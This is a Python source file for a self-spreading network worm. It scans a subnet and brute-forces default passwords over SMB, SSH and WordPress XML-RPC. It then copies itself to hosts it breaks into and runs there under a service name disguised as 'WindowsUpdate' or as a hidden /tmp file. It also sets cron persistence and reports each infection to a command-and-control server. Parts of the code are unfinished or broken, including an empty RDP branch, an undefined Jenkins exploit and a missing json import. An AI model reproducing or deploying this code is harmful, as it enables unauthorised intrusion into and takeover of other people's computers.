import os
import socket
import subprocess
import platform
import random
import threading
import paramiko
import requests
import scapy.all as scapy
from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations

class Worm:
    def __init__(self, cnc_ip, cnc_port):
        self.cnc_ip = cnc_ip
        self.cnc_port = cnc_port
        self.payload_url = None
        self.spreading = False
        self.infected = []
        self.common_creds = [
            ('administrator', 'password'),
            ('admin', 'admin'),
            ('root', 'toor'),
            ('user', 'user')
        ]

    def scan_network(self, subnet='192.168.1.0/24'):
        """Scan for vulnerable hosts using ARP and port scanning"""
        print(f"[WORM] Scanning {subnet} for targets...")
        hosts = []
        try:
            # ARP scan to find live hosts
            ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=subnet), timeout=2, verbose=0)
            for snd, rcv in ans:
                ip = rcv.psrc
                # Check for common vulnerable ports
                for port in [445, 22, 3389, 80]:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    if s.connect_ex((ip, port)) == 0:
                        hosts.append((ip, port))
                    s.close()
        except Exception as e:
            print(f"[WORM] Scan error: {str(e)}")
        return hosts

    def spread(self, os_filter='all'):
        """Spread worm to vulnerable hosts using real exploits"""
        self.spreading = True
        targets = self.scan_network()
        
        for target_ip, target_port in targets:
            if not self.spreading:
                break
                
            try:
                # Windows targets (SMB/RDP)
                if target_port in [445, 3389] and os_filter in ['all', 'windows']:
                    self.exploit_windows(target_ip, target_port)
                
                # Linux targets (SSH)
                if target_port == 22 and os_filter in ['all', 'linux']:
                    self.exploit_linux(target_ip)
                    
                # Web servers
                if target_port == 80 and os_filter in ['all', 'web']:
                    self.exploit_web(target_ip)
                    
            except Exception as e:
                continue

    def exploit_windows(self, target_ip, port):
        """Exploit Windows via SMB or RDP"""
        try:
            if port == 445:  # SMB exploitation
                for username, password in self.common_creds:
                    try:
                        smb = SMBConnection(target_ip, target_ip)
                        smb.login(username, password)
                        
                        # Upload worm executable
                        with open('worm.exe', 'rb') as f:
                            smb.putFile('C$', '/Windows/Temp/worm.exe', f.read)
                        
                        # Execute via service creation
                        service_name = f"WindowsUpdate_{random.randint(1000,9999)}"
                        smb.createService(service_name, 'C:\\Windows\\Temp\\worm.exe')
                        smb.startService(service_name)
                        
                        self.infected.append({'ip': target_ip, 'os': 'windows', 'vector': 'smb'})
                        self.report_infection(target_ip, 'windows', 'smb')
                        break
                    except:
                        continue

            elif port == 3389:  # RDP exploitation
                # Use RDP hijacking or credential stuffing
                pass
                
        except Exception as e:
            print(f"[WORM] Windows exploit failed: {str(e)}")

    def exploit_linux(self, target_ip):
        """Exploit Linux via SSH"""
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        for username, password in self.common_creds:
            try:
                ssh.connect(target_ip, username=username, password=password, timeout=5)
                
                # Upload and execute worm
                sftp = ssh.open_sftp()
                sftp.put('worm.py', '/tmp/.worm.py')
                sftp.chmod('/tmp/.worm.py', 0o755)
                
                # Add persistence
                stdin, stdout, stderr = ssh.exec_command('echo "@reboot /tmp/.worm.py" | crontab -')
                stdin, stdout, stderr = ssh.exec_command('nohup /tmp/.worm.py &')
                
                self.infected.append({'ip': target_ip, 'os': 'linux', 'vector': 'ssh'})
                self.report_infection(target_ip, 'linux', 'ssh')
                break
            except:
                continue

    def exploit_web(self, target_ip):
        """Exploit web servers"""
        try:
            # Check for vulnerable web apps
            vuln_paths = ['/admin', '/wp-login.php', '/console']
            for path in vuln_paths:
                url = f"http://{target_ip}{path}"
                try:
                    r = requests.get(url, timeout=3)
                    if r.status_code == 200:
                        # Try common web exploits
                        if 'wp-login.php' in url:
                            self.exploit_wordpress(target_ip)
                        elif 'console' in url:
                            self.exploit_jenkins(target_ip)
                except:
                    continue
        except Exception as e:
            print(f"[WORM] Web exploit failed: {str(e)}")

    def exploit_wordpress(self, target_ip):
        """WordPress XML-RPC brute force"""
        url = f"http://{target_ip}/xmlrpc.php"
        for username, password in [('admin', 'admin'), ('editor', 'editor')]:
            data = f"""
            <methodCall>
                <methodName>wp.getUsersBlogs</methodName>
                <params>
                    <param><value>{username}</value></param>
                    <param><value>{password}</value></param>
                </params>
            </methodCall>
            """
            try:
                r = requests.post(url, data=data, timeout=3)
                if 'isAdmin' in r.text:
                    # Upload and execute payload
                    self.infected.append({'ip': target_ip, 'os': 'web', 'vector': 'wordpress'})
                    self.report_infection(target_ip, 'web', 'wordpress')
                    break
            except:
                continue

    def report_infection(self, ip, os, vector):
        """Report successful infection to C&C"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.cnc_ip, self.cnc_port))
            report = {
                'cmd': 'worm_report',
                'data': {
                    'ip': ip,
                    'os': os,
                    'vector': vector
                }
            }
            s.send(json.dumps(report).encode())
            s.close()
        except:
            pass

    def stop_spreading(self):
        """Stop the worm propagation"""
        self.spreading = False
